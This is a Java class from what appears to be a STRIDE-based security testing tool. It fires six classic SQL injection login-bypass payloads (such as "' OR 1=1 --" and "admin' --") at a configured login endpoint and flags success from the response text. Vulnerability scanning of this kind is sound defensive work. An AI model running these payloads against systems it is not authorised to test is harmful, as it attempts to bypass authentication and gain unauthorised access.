package attacks;

import config.AttackConfig;
import model.AttackResult;
import model.StrideCategory;
import util.HttpUtil;

public class SqlInjectionAttack {

    public static AttackResult run(AttackConfig config) {

        String[] payloads = {
            "' OR 1=1 --",
            "' OR '1'='1",
            "admin' --",
            "' OR 1=1#",
            "1' OR '1' = '1",
            "' UNION SELECT NULL--"
        };

        String endpoint = config.loginEndpoint;
        String url = config.targetUrl + endpoint;

        for (String injection : payloads) {
            String payload = String.format("""
            {
              "username": "%s",
              "password": "anything"
            }
            """, injection);

            String response = HttpUtil.post(url, payload);

            if (response.contains("success") || response.contains("token") ||
                response.contains("authenticated")) {

                String details = String.format(
                    "SQL injection successful using payload: '%s'. Response: %s",
                    injection, truncate(response, 150));

                return new AttackResult("SQL Injection", true, details,
                    StrideCategory.TAMPERING, "SqlInjectionAttack", endpoint);
            }
        }

        return new AttackResult("SQL Injection", false,
            "No SQL injection vulnerability detected. Tested " + payloads.length + " payloads",
            StrideCategory.TAMPERING, "SqlInjectionAttack", endpoint);
    }

    private static String truncate(String str, int maxLength) {
        return str.length() <= maxLength ? str : str.substring(0, maxLength) + "...";
    }
}
